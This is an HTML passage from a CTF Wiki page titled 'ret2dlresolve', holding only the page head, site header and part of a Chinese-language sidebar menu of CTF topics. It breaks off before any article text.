<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CTF Wiki"><meta name=author content="CTF Wiki Team"><link href=https://ctf-wiki.org/zh-tw/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/ rel=canonical><link rel=alternate href=/ hreflang=zh><link rel=alternate href=/en/ hreflang=zh><link rel=alternate href=/zh-tw/ hreflang=zh><link rel="shortcut icon" href=../../../../../../../assets/images/favicon.png><meta name=generator content="mkdocs-1.6.1, mkdocs-material-6.2.8+insiders-1.17.0"><title>ret2dlresolve - CTF Wiki</title><link rel=stylesheet href=../../../../../../../assets/stylesheets/main.10cb3b3f.min.css><link rel=stylesheet href=../../../../../../../assets/stylesheets/palette.697e47cb.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font-family:"Noto Sans",;--md-code-font-family:"Source Code Pro",}</style><link rel=stylesheet href=https://ctf-wiki.org/static/css/extra.css></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#ret2dlresolve class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=Header> <a href=https://ctf-wiki.org/zh-tw/ title="CTF Wiki" class="md-header__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> CTF Wiki </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> ret2dlresolve </span> </div> </div> </div> <div class=md-header__options> <div class=md-select> <span class="md-header__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M12.87 15.07l-2.54-2.51.03-.03A17.52 17.52 0 0014.07 6H17V4h-7V2H8v2H1v2h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04M18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12m-2.62 7l1.62-4.33L19.12 17h-3.24z"/></svg> </span> <div class=md-select__inner> <ul class=md-select__list> <li class=md-select__item> <a href=/ class=md-select__link> zh - 汉语 </a> </li> <li class=md-select__item> <a href=/en/ class=md-select__link> en - English </a> </li> <li class=md-select__item> <a href=/zh-tw/ class=md-select__link> zh-tw - 繁體中文 </a> </li> </ul> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query data-md-state=active required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=Search> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=Share data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 00-3 3 3 3 0 003 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0018 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=Clear data-md-component=search-reset tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> <div class=md-header__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="前往 GitHub 仓库" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> </nav> <nav class=md-tabs aria-label=Tabs data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../../../../../../.. class=md-tabs__link> Start </a> </li> <li class=md-tabs__item> <a href=../../../../../../../introduction/history/ class=md-tabs__link> Introduction </a> </li> <li class=md-tabs__item> <a href=../../../../../../../misc/introduction/ class=md-tabs__link> Misc </a> </li> <li class=md-tabs__item> <a href=../../../../../../../crypto/introduction/ class=md-tabs__link> Crypto </a> </li> <li class=md-tabs__item> <a href=../../../../../../../web/introduction/ class=md-tabs__link> Web </a> </li> <li class=md-tabs__item> <a href=../../../../../../../assembly/x86-x64/readme/ class=md-tabs__link> Assembly </a> </li> <li class=md-tabs__item> <a href=../../../../../../../executable/elf/structure/basic-info/ class=md-tabs__link> Executable </a> </li> <li class=md-tabs__item> <a href=../../../../../../../reverse/introduction/ class=md-tabs__link> Reverse </a> </li> <li class=md-tabs__item> <a href=../../../../environment/ class="md-tabs__link md-tabs__link--active"> Pwn </a> </li> <li class=md-tabs__item> <a href=../../../../../../../android/basic_develop/basic_develop/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../../../../../../ics/ctfs/ class=md-tabs__link> ICS </a> </li> <li class=md-tabs__item> <a href=../../../../../../../blockchain/introduction/ class=md-tabs__link> Blockchain </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=Navigation data-md-level=0> <label class=md-nav__title for=__drawer> <a href=https://ctf-wiki.org/zh-tw/ title="CTF Wiki" class="md-nav__button md-logo" aria-label="CTF Wiki"> <img src=https://ctf-wiki.org/static/img/logo.png alt=logo> </a> CTF Wiki </label> <div class=md-nav__source> <a href=https://github.com/ctf-wiki/ctf-wiki title="前往 GitHub 仓库" class=md-source> <div class="md-source__icon md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 480 512"><path d="M186.1 328.7c0 20.9-10.9 55.1-36.7 55.1s-36.7-34.2-36.7-55.1 10.9-55.1 36.7-55.1 36.7 34.2 36.7 55.1zM480 278.2c0 31.9-3.2 65.7-17.5 95-37.9 76.6-142.1 74.8-216.7 74.8-75.8 0-186.2 2.7-225.6-74.8-14.6-29-20.2-63.1-20.2-95 0-41.9 13.9-81.5 41.5-113.6-5.2-15.8-7.7-32.4-7.7-48.8 0-21.5 4.9-32.3 14.6-51.8 45.3 0 74.3 9 108.8 36 29-6.9 58.8-10 88.7-10 27 0 54.2 2.9 80.4 9.2 34-26.7 63-35.2 107.8-35.2 9.8 19.5 14.6 30.3 14.6 51.8 0 16.4-2.6 32.7-7.7 48.2 27.5 32.4 39 72.3 39 114.2zm-64.3 50.5c0-43.9-26.7-82.6-73.5-82.6-18.9 0-37 3.4-56 6-14.9 2.3-29.8 3.2-45.1 3.2-15.2 0-30.1-.9-45.1-3.2-18.7-2.6-37-6-56-6-46.8 0-73.5 38.7-73.5 82.6 0 87.8 80.4 101.3 150.4 101.3h48.2c70.3 0 150.6-13.4 150.6-101.3zm-82.6-55.1c-25.8 0-36.7 34.2-36.7 55.1s10.9 55.1 36.7 55.1 36.7-34.2 36.7-55.1-10.9-55.1-36.7-55.1z"/></svg> </div> <div class=md-source__repository> ctf-wiki/ctf-wiki </div> </a> </div> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1 type=checkbox id=nav-1> <label class=md-nav__link for=nav-1> Start <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Start data-md-level=1> <label class=md-nav__title for=nav-1> <span class="md-nav__icon md-icon"></span> Start </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../.. class=md-nav__link> 簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../usage/ class=md-nav__link> 如何使用 CTF Wiki </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-1-3 type=checkbox id=nav-1-3> <label class=md-nav__link for=nav-1-3> 貢獻指南 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=貢獻指南 data-md-level=2> <label class=md-nav__title for=nav-1-3> <span class="md-nav__icon md-icon"></span> 貢獻指南 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../contribute/before-contributing/ class=md-nav__link> 貢獻之前 </a> </li> <li class=md-nav__item> <a href=../../../../../../../contribute/basic-contribute-approach/ class=md-nav__link> 基本貢獻方式 </a> </li> <li class=md-nav__item> <a href=../../../../../../../contribute/documentation-requirement/ class=md-nav__link> 貢獻文檔要求 </a> </li> <li class=md-nav__item> <a href=../../../../../../../contribute/translation/ class=md-nav__link> 翻譯 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../discussion/ class=md-nav__link> 討論交流 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-2 type=checkbox id=nav-2> <label class=md-nav__link for=nav-2> Introduction <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Introduction data-md-level=1> <label class=md-nav__title for=nav-2> <span class="md-nav__icon md-icon"></span> Introduction </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../introduction/history/ class=md-nav__link> CTF 歷史 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/mode/ class=md-nav__link> CTF 競賽模式簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/content/ class=md-nav__link> CTF 競賽內容 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/experience/ class=md-nav__link> 線下攻防經驗小結 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/cgc/ class=md-nav__link> CGC 超級挑戰賽 </a> </li> <li class=md-nav__item> <a href=../../../../../../../introduction/resources/ class=md-nav__link> 學習資源 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3 type=checkbox id=nav-3> <label class=md-nav__link for=nav-3> Misc <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Misc data-md-level=1> <label class=md-nav__title for=nav-3> <span class="md-nav__icon md-icon"></span> Misc </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/introduction/ class=md-nav__link> 雜項簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/recon/ class=md-nav__link> 信息蒐集技術 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-3 type=checkbox id=nav-3-3> <label class=md-nav__link for=nav-3-3> 編碼分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=編碼分析 data-md-level=2> <label class=md-nav__title for=nav-3-3> <span class="md-nav__icon md-icon"></span> 編碼分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/encode/communication/ class=md-nav__link> 通信領域常用編碼 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/encode/computer/ class=md-nav__link> 計算機相關的編碼 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/encode/modern/ class=md-nav__link> 現實世界中常用的編碼 </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../misc/prefix/ class=md-nav__link> 取證隱寫前置技術 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-5 type=checkbox id=nav-3-5> <label class=md-nav__link for=nav-3-5> 圖片分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=圖片分析 data-md-level=2> <label class=md-nav__title for=nav-3-5> <span class="md-nav__icon md-icon"></span> 圖片分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/picture/introduction/ class=md-nav__link> 圖片分析簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/picture/png/ class=md-nav__link> PNG </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/picture/jpg/ class=md-nav__link> JPG </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/picture/gif/ class=md-nav__link> GIF </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-6 type=checkbox id=nav-3-6> <label class=md-nav__link for=nav-3-6> 音頻隱寫 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=音頻隱寫 data-md-level=2> <label class=md-nav__title for=nav-3-6> <span class="md-nav__icon md-icon"></span> 音頻隱寫 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/audio/introduction/ class=md-nav__link> 音頻隱寫 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7 type=checkbox id=nav-3-7> <label class=md-nav__link for=nav-3-7> 流量包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流量包分析 data-md-level=2> <label class=md-nav__title for=nav-3-7> <span class="md-nav__icon md-icon"></span> 流量包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/introduction/ class=md-nav__link> 流量包分析簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/fix/ class=md-nav__link> PCAP 文件修復 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-7-3 type=checkbox id=nav-3-7-3> <label class=md-nav__link for=nav-3-7-3> 協議分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=協議分析 data-md-level=3> <label class=md-nav__title for=nav-3-7-3> <span class="md-nav__icon md-icon"></span> 協議分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/readme/ class=md-nav__link> 協議分析概述 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/wireshark/ class=md-nav__link> Wireshark </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/http/ class=md-nav__link> HTTP </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/https/ class=md-nav__link> HTTPS </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/ftp/ class=md-nav__link> FTP </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/dns/ class=md-nav__link> DNS </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/wifi/ class=md-nav__link> WIFI </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/protocols/usb/ class=md-nav__link> USB </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../../../../../../misc/traffic/data/ class=md-nav__link> 數據提取 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-8 type=checkbox id=nav-3-8> <label class=md-nav__link for=nav-3-8> 壓縮包分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=壓縮包分析 data-md-level=2> <label class=md-nav__title for=nav-3-8> <span class="md-nav__icon md-icon"></span> 壓縮包分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/archive/zip/ class=md-nav__link> ZIP 格式 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/archive/rar/ class=md-nav__link> RAR 格式 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-9 type=checkbox id=nav-3-9> <label class=md-nav__link for=nav-3-9> 磁盤內存分析 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=磁盤內存分析 data-md-level=2> <label class=md-nav__title for=nav-3-9> <span class="md-nav__icon md-icon"></span> 磁盤內存分析 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/disk-memory/introduction/ class=md-nav__link> 磁盤內存分析 </a> </li> <li class=md-nav__item> <a href=../../../../../../../misc/disk-memory/problem/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-3-10 type=checkbox id=nav-3-10> <label class=md-nav__link for=nav-3-10> Other <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Other data-md-level=2> <label class=md-nav__title for=nav-3-10> <span class="md-nav__icon md-icon"></span> Other </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../misc/other/pyc/ class=md-nav__link> pyc文件 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4 type=checkbox id=nav-4> <label class=md-nav__link for=nav-4> Crypto <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Crypto data-md-level=1> <label class=md-nav__title for=nav-4> <span class="md-nav__icon md-icon"></span> Crypto </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/introduction/ class=md-nav__link> 密碼學簡介 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-2 type=checkbox id=nav-4-2> <label class=md-nav__link for=nav-4-2> 基礎數學知識 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=基礎數學知識 data-md-level=2> <label class=md-nav__title for=nav-4-2> <span class="md-nav__icon md-icon"></span> 基礎數學知識 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/basic/introduction/ class=md-nav__link> 基礎數學知識 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-3 type=checkbox id=nav-4-3> <label class=md-nav__link for=nav-4-3> 古典密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=古典密碼 data-md-level=2> <label class=md-nav__title for=nav-4-3> <span class="md-nav__icon md-icon"></span> 古典密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/introduction/ class=md-nav__link> 古典密碼簡介 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/monoalphabetic/ class=md-nav__link> 單表代換加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/polyalphabetic/ class=md-nav__link> 多表代換加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/others/ class=md-nav__link> 其它類型加密 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/classical/summary/ class=md-nav__link> 總結 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4 type=checkbox id=nav-4-4> <label class=md-nav__link for=nav-4-4> 流密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=流密碼 data-md-level=2> <label class=md-nav__title for=nav-4-4> <span class="md-nav__icon md-icon"></span> 流密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/intro/ class=md-nav__link> 流密碼 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-2 type=checkbox id=nav-4-4-2> <label class=md-nav__link for=nav-4-4-2> 僞隨機數生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=僞隨機數生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-2> <span class="md-nav__icon md-icon"></span> 僞隨機數生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/prng/intro/ class=md-nav__link> 僞隨機數生成器介紹 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/prng/csprng/ class=md-nav__link> 密碼安全僞隨機數生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/prng/problem/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-3 type=checkbox id=nav-4-4-3> <label class=md-nav__link for=nav-4-4-3> 線性同餘生成器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=線性同餘生成器 data-md-level=3> <label class=md-nav__title for=nav-4-4-3> <span class="md-nav__icon md-icon"></span> 線性同餘生成器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/lcg/intro/ class=md-nav__link> 線性同餘生成器 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/lcg/challenge/ class=md-nav__link> 題目 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-4 type=checkbox id=nav-4-4-4> <label class=md-nav__link for=nav-4-4-4> 反饋移位寄存器 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=反饋移位寄存器 data-md-level=3> <label class=md-nav__title for=nav-4-4-4> <span class="md-nav__icon md-icon"></span> 反饋移位寄存器 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/fsr/intro/ class=md-nav__link> 反饋移位寄存器 </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/fsr/lfsr/ class=md-nav__link> 線性反饋移位寄存器 - LFSR </a> </li> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/fsr/nfsr/ class=md-nav__link> 非線性反饋移位寄存器 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-4-5 type=checkbox id=nav-4-4-5> <label class=md-nav__link for=nav-4-4-5> 特殊流密碼 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=特殊流密碼 data-md-level=3> <label class=md-nav__title for=nav-4-4-5> <span class="md-nav__icon md-icon"></span> 特殊流密碼 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/streamcipher/special/rc4/ class=md-nav__link> RC4 </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5 type=checkbox id=nav-4-5> <label class=md-nav__link for=nav-4-5> 塊加密 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=塊加密 data-md-level=2> <label class=md-nav__title for=nav-4-5> <span class="md-nav__icon md-icon"></span> 塊加密 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/introduction/ class=md-nav__link> 塊加密 </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-2 type=checkbox id=nav-4-5-2> <label class=md-nav__link for=nav-4-5-2> ARX <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=ARX data-md-level=3> <label class=md-nav__title for=nav-4-5-2> <span class="md-nav__icon md-icon"></span> ARX </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/arx-operations/ class=md-nav__link> ARX: Add-Rotate-Xor </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-3 type=checkbox id=nav-4-5-3> <label class=md-nav__link for=nav-4-5-3> DES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=DES data-md-level=3> <label class=md-nav__title for=nav-4-5-3> <span class="md-nav__icon md-icon"></span> DES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/des/ class=md-nav__link> DES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-4 type=checkbox id=nav-4-5-4> <label class=md-nav__link for=nav-4-5-4> IDEA <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=IDEA data-md-level=3> <label class=md-nav__title for=nav-4-5-4> <span class="md-nav__icon md-icon"></span> IDEA </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/idea/ class=md-nav__link> IDEA </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-5 type=checkbox id=nav-4-5-5> <label class=md-nav__link for=nav-4-5-5> AES <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=AES data-md-level=3> <label class=md-nav__title for=nav-4-5-5> <span class="md-nav__icon md-icon"></span> AES </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../../../../../../crypto/blockcipher/aes/ class=md-nav__link> AES </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=nav-4-5-6 type=checkbox id=nav-4-5-6> <label class=md-nav__link for=nav-4-5-6> Simon and Speck <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label="Simon and Speck" data-md-level=3> <label class=md-nav__title for=nav-4-5-6> <span class="md-nav__icon 